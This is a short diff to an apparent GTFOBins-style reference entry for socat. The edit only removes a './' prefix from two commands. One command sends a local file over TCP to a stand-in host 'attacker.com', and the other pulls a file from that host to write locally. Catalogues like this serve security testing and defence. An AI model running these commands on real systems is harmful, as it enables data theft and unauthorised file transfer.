@@ -29,12 +29,12 @@ functions:
         RHOST=attacker.com
         RPORT=12345
         LFILE=file_to_send
-        ./socat -u file:$LFILE tcp-connect:$RHOST:$RPORT
+        socat -u file:$LFILE tcp-connect:$RHOST:$RPORT
   file-download:
     - description: Run ``socat -u file:file_to_send tcp-listen:12345,reuseaddr`` on the attacker box to send the file.
       code: |
         RHOST=attacker.com
         RPORT=12345
         LFILE=file_to_save
-        ./socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat
+        socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat
 ---
